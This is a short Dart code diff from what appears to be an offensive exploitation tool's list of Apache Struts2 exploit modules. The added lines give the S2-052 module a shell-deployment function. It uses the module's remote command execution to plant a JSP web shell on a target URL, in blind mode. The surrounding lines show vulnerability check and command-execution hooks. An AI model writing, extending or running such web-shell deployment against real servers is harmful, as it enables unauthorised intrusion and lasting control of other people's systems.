@@ -183,6 +183,13 @@ List<ExploitModule> _struts2Modules() => [
       await Struts2ExpService(url: t.url).checkS2052(),
     ),
     execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2052(cmd),
+    shellFn: (t) async => ShellDeployer.deploy(
+      targetUrl: t.url,
+      exec: (cmd) => Struts2ExpService(url: t.url).execS2052(cmd),
+      kind: ShellKind.jsp,
+      blind: true,
+      timeout: t.timeout,
+    ),
   ),
   SimpleExploitModule(
     id: 'struts2-s2053',
